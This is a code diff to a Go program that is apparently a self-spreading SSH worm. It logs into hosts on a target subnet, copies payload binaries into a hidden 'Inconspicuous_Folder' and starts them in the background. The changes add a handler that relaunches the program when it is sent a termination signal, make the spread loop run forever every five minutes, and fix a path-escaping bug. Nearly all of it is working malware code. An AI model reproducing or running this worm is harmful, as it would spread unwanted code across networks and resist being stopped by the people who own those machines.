@@ -6,20 +6,35 @@ import (
 	"io/ioutil"
 	"strconv"
 	"log"
+    "syscall"
 )
 
 //Put in target subnet in the form 10.2.3.
 import (
-		"golang.org/x/crypto/ssh"
-		"fmt"
-		"time"
-		"strings"
-		"bufio"
-		"sync"
-		"github.com/tmc/scp"
+	"golang.org/x/crypto/ssh"
+	"fmt"
+	"time"
+	"strings"
+	"bufio"
+	"sync"
+	"github.com/tmc/scp"
+	"github.com/syossan27/tebata"
+	"os/exec"
 )
+
+func handler1() {
+	cmd := exec.Command(os.Args[0])
+	cmd.Start()
+	os.Exit(13)
+}
+
 func main(){
+    t := tebata.New(syscall.SIGINT, syscall.SIGTERM, syscall.SIGABRT, syscall.SIGKILL)
+	t.Reserve(handler1)
+	fmt.Println("test")
+
 	myos := runtime.GOOS
+
 	if myos=="windows" {
 		if _, err := os.Stat("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt"); os.IsNotExist(err) {
 			ioutil.WriteFile("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt",[]byte("hello"),0644)
@@ -33,8 +48,8 @@ func main(){
 			os.Exit(3)
 		}
 	}
-	sum := 1
-	for sum  == 1 {
+
+	for {
 		startwormingboi(myos)
 		time.Sleep(5 * time.Minute)
 	}
@@ -142,7 +157,7 @@ func getinssh(myip string, user string, passwd string) (myreturn string) {
 
 	session := newsession(connection)
 	if (execlinuxcmd(session, "who")!=nil) {
-		execlinuxcmd(session, "mkdir \Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder'")
+		execlinuxcmd(session, "mkdir \\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder'")
 		scpexec(session, "linuxhappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\linuxhappyfuntimes")
 		scpexec(session, "windowshappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
 		execlinuxcmd(session, "START /B \\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
